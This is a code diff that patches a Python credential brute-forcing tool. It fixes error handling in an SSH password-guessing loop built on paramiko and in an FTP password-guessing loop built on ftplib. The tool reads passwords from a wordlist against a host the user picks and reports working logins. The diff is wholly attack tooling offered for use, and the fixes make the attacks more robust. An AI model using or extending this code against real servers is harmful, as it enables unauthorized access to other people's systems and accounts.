@@ -478,6 +478,9 @@ try:
                                         print("[\u001b[31m-\u001b[0m] " + username + '@' + target + ':' + password)
                                     except paramiko.ssh_exception.SSHException:
                                         time.sleep(60)
+                                    except ConnectionResetError:
+                                        print("Connection Forcibly Closed By Host.\n")
+                                        break
                                     else:
                                         print("\n\nLogin Found!\n[\u001b[32m+\u001b[0m] " + username + '@' + target + ':' + password + '\n')
                                         break
@@ -494,7 +497,7 @@ try:
                             host = str(input("\n\u001b[38;5;50mFTP CREDENTIAL BRUTE FORCER\u001b[0m\n\nWhat FTP Host would you like to brute force the credentials to? : "))
                             username = input("What username would you like to use? : ")
                             wordlist = input("What is the file path of the wordlist you would like to use? : ")
-                            print("Brute Forcing the FTP credentials for " + str(username) + "@" + str(target) + "...")
+                            print("Brute Forcing the FTP credentials for " + str(username) + "@" + str(host) + "...")
                             with open(str(wordlist), 'r') as list:
                                 for line in list:
                                     try:
@@ -502,8 +505,9 @@ try:
                                         ftp = ftplib.FTP(host)
                                         ftp.login(str(username), str(password))
                                         ftp.quit()
-                                    except:
+                                    except ftplib.error_perm:
                                         print("[\u001b[31m-\u001b[0m] " + str(username) + '@' + str(host) + ':' + str(password))
+                                    
                                     else:
                                         print("\n\nLogin Found!\n[\u001b[32m+\u001b[0m] " + str(username) + '@' + str(host) + ':' + str(password) + '\n')
                                         break
